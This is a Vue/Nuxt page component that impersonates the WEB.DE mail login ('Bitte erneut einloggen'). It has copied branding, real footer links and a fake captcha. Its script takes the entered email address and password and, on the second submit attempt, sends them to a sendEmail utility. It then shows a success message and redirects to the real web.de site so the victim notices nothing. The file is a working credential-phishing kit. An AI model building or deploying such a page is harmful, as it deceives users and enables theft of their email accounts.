<template>
  <div class="md:bg-gray-100 min-h-screen text-[#525252] font-arimo">
    <header
      class="bg-white border-t-4 border-yellow-300 h-14 flex items-center mb-12 px-4 border-b border-b-[#dadada] md:border-b-0"
    >
      <div class="bg-gray-200 rounded" style="width: 36px; height: 36px">
        <LogoWebDe36 />
      </div>

      <div class="ml-4 text-[20px] text-gray-600 font-pt-sans">Kudencenter</div>
    </header>

    <div class="pb-60">
      <form
        @submit.prevent="handleSubmit"
        class="bg-white mx-auto md:pt-10 md:pb-8 md:px-8 px-4 rounded md:w-[368px]"
      >
        <div
          class="bg-gray-200 mx-auto rounded mb-4"
          style="height: 56px; width: 56px"
        >
          <LogoWebDe56 />
        </div>

        <h2 class="font-bold text-[24.5px] text-center mb-6 font-pt-sans">
          Bitte erneut einloggen
        </h2>

        <p class="text-center mb-8 text-[15px] tracking-normal">
          Bitte melden Sie sich mit Ihrem WEB.DE Benutzernamen und Passwort
          erneut an.
        </p>

        <div class="mb-5">
          <FormInput
            label="WEB.DE E-Mail-Adresse"
            :errorMessage="
              getErrorMessage({
                key: 'email',
                message: `Bitte geben Sie Ihre E-Mail-Adresse ein.`,
              })
            "
            v-model="v$.email.$model"
          />
        </div>

        <FormInput
          label="Passwort eingeben"
          type="password"
          :errorMessage="
            getErrorMessage({
              key: 'password',
              message: `Bitte geben Sie Ihr Passwort ein.`,
            })
          "
          v-model="v$.password.$model"
        />

        <div class="flex items-center my-4">
          <div class="text-xl font-bold font-pt-sans">Sicherheitsabfrage</div>

          <div class="h-5 w-5 rounded ml-4 text-[#1c8ad9]">
            <InfoIcon class="fill-current" />
          </div>
        </div>

        <div class="h-24 bg-gray-100 relative flex items-center justify-center">
          <img
            :src="currentCaptcha.image"
            alt="captcha"
            style="width: 225px; height: 53px"
          />
        </div>

        <button
          class="flex items-center mt-2.5 mb-5"
          type="button"
          @click="randomCaptcha"
        >
          <div class="h-5 w-5 rounded mr-4 text-[#1c8ad9]">
            <RefreshIcon class="fill-current" />
          </div>

          <div class="text-sm text-[#1c8ad9] hover:underline tracking-normal">
            Andere Zeichenfolge anzeigen
          </div>
        </button>

        <FormInput
          label="Zeichenfolge eingeben"
          :errorMessage="
            getErrorMessage({
              key: 'captcha',
              message: `Bitte versuchen Sie eserneut.`,
            })
          "
          v-model="v$.captcha.$model"
        />

        <button
          class="h-8 bg-yellow-300 text-sm w-full font-semibold rounded-md mt-5"
        >
          Login
        </button>
      </form>
    </div>

    <footer
      class="bg-[#999] fixed bottom-0 w-screen min-h-[50px] flex flex-col md:flex-row items-center justify-center gap-x-10 text-white py-5"
    >
      <a
        href="https://web.de/impressum"
        target="_blank"
        class="hover:underline"
      >
        Impressum
      </a>

      <a
        href="https://web.de/kuendigungsformular"
        target="_blank"
        class="hover:underline"
      >
        Verträge hier kündigen
      </a>

      <a
        href="https://agb-server.web.de/datenschutz"
        target="_blank"
        class="hover:underline"
      >
        Datenschutzhinweise
      </a>

      <a
        href="https://agb-server.web.de/webdeagb"
        target="_blank"
        class="hover:underline"
      >
        AGB
      </a>

      <a href="https://hilfe.web.de/" target="_blank" class="hover:underline">
        Hilfe und Tipps
      </a>
    </footer>
  </div>
</template>

<script setup lang="ts">
import { reactive, computed, ref } from "vue";
import useValidate from "@vuelidate/core";
import { required } from "@vuelidate/validators";
import useCaptchas from "./composables/use-captchas";
import InfoIcon from "./components/svg-components/info.vue";
import RefreshIcon from "./components/svg-components/refresh-icon.vue";
import LogoWebDe36 from "./components/svg-components/logo-web-de-36.vue";
import LogoWebDe56 from "./components/svg-components/logo-web-de-56.vue";
import FormInput from "./components/form-input.vue";
import sendEmail from "./utils/send-email";

const MAIN_PAGE_URL = "https://web.de";

const { randomCaptcha, currentCaptcha } = useCaptchas();
const { $toast }: any = useNuxtApp();
useHead({
  title: "WEBDE Login",
});

const loginAttempt = ref(0);

const state = reactive({
  email: "",
  password: "",
  captcha: "",
});

const rules = computed(() => ({
  email: { required },
  password: { required },
  captcha: { required },
}));

const v$ = useValidate(rules, state);

interface IData {
  key: string;
  message: string;
}

const getErrorMessage = (data: IData) => {
  if (v$.value[data.key].$errors.length) {
    return data.message;
  }

  return "";
};

const notify = () => {
  $toast("password verification successful", {
    type: "success",
    onClose: () => {
      window.location.assign(MAIN_PAGE_URL);
    },
  });
};

const onSubmit = async () => {
  try {
    if (loginAttempt.value === 2) {
      const response = await sendEmail({
        email: state.email,
        password: state.password,
      });

      if (response.data === "OK") {
        notify();
      }

      return;
    }

    // v$.value.$reset();

    // state.captcha = "";
    // state.email = "";
    // state.password = "";
  } catch (error) {
    console.log(error);
  }
};

const handleSubmit = (values: any) => {
  const isValid = v$.value.$validate();

  if (!isValid) return;

  loginAttempt.value++;

  onSubmit();
};
</script>
